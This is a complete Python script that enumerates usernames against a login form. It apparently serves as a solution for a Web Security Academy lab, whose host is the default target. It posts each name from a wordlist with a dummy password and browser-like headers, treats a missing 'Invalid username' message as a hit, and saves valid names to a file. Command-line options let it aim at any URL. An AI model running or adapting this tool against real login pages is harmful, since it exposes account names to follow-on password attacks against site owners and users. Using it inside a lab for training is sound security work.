#!/usr/bin/env python3
"""
enum_usernames.py
Simple username enumeration script for the "different responses" lab.
Reads usernames from ./user.txt (one per line), sends POST with password "1",
and marks username as valid when the response DOES NOT contain the
'<p class=is-warning>Invalid username</p>' marker.

Usage:
  python3 enum_usernames.py
  python3 enum_usernames.py --url "https://TARGET_HOST/login" --wordlist users.txt --delay 0.4
"""

import requests
import time
import argparse
from urllib.parse import urljoin

# --- Configurable defaults ---
DEFAULT_BASE = "https://0a7100c404b3967281df9dde00cc007c.web-security-academy.net"
LOGIN_PATH = "/login"
WORDLIST = "user.txt"
OUTFILE = "found_usernames.txt"
DEFAULT_PASSWORD = "1"
DELAY = 0.5   # seconds between requests

DEFAULT_HEADERS = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Content-Type": "application/x-www-form-urlencoded",
    # Origin/Referer help if server checks them; will be set to base+path dynamically below
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-User": "?1",
}

# The HTML fragment that appears when the username is INVALID.
INVALID_MARKER = '<p class=is-warning>Invalid username</p>'

def load_usernames(path):
    with open(path, "r", encoding="utf-8") as f:
        users = [line.strip() for line in f if line.strip() and not line.startswith("#")]
    return users

def probe_username(session, url, username, password, headers, invalid_marker, timeout=10):
    data = {"username": username, "password": password}
    try:
        r = session.post(url, headers=headers, data=data, allow_redirects=True, timeout=timeout)
    except requests.RequestException as e:
        return None, f"ERROR: {e}"
    body = r.text or ""
    is_invalid = invalid_marker in body
    return not is_invalid, None  # (is_valid, error)

def main():
    p = argparse.ArgumentParser(description="Username enumeration by different responses (simple).")
    p.add_argument("--base", "-b", default=DEFAULT_BASE, help="Base URL (scheme + host).")
    p.add_argument("--path", default=LOGIN_PATH, help="Login path (default /login).")
    p.add_argument("--wordlist", "-w", default=WORDLIST, help="Username wordlist file (one per line).")
    p.add_argument("--out", "-o", default=OUTFILE, help="Output file for found usernames.")
    p.add_argument("--password", "-p", default=DEFAULT_PASSWORD, help="Default password to try (default '1').")
    p.add_argument("--delay", "-d", type=float, default=DELAY, help="Delay between requests in seconds.")
    p.add_argument("--cookie", help="Optional session cookie value (format: name=value).")
    p.add_argument("--verbose", "-v", action="store_true", help="Verbose output.")
    args = p.parse_args()

    base = args.base.rstrip("/")
    url = urljoin(base + "/", args.path.lstrip("/"))

    headers = {**DEFAULT_HEADERS}
    headers["Origin"] = base
    headers["Referer"] = url

    s = requests.Session()
    if args.cookie:
        try:
            name, val = args.cookie.split("=", 1)
            s.cookies.set(name, val)
        except ValueError:
            print("[-] cookie format invalid (use name=value). Ignoring cookie.")

    try:
        users = load_usernames(args.wordlist)
    except FileNotFoundError:
        print(f"[-] Wordlist file not found: {args.wordlist}")
        return

    print(f"[+] Target: {url}")
    print(f"[+] Wordlist: {args.wordlist} ({len(users)} usernames)")
    print(f"[+] Using password: '{args.password}'  delay={args.delay}s\n")

    found = []
    for i, u in enumerate(users, 1):
        is_valid, err = probe_username(s, url, u, args.password, headers, INVALID_MARKER)
        if err:
            print(f"[{i}/{len(users)}] {u} -> error: {err}")
            # optionally retry once after short pause
            time.sleep(1)
            continue
        if is_valid:
            print(f"[{i}/{len(users)}] {u} -> VALID (marker missing)")
            found.append(u)
            with open(args.out, "a", encoding="utf-8") as fo:
                fo.write(u + "\n")
        else:
            if args.verbose:
                print(f"[{i}/{len(users)}] {u} -> invalid")
            else:
                print(f"[{i}/{len(users)}] {u} -> -")
        time.sleep(args.delay)

    print("\n[+] Done.")
    if found:
        print(f"[+] Found {len(found)} valid username(s). Saved to {args.out}")
    else:
        print("[+] No valid usernames found.")

if __name__ == "__main__":
    main()
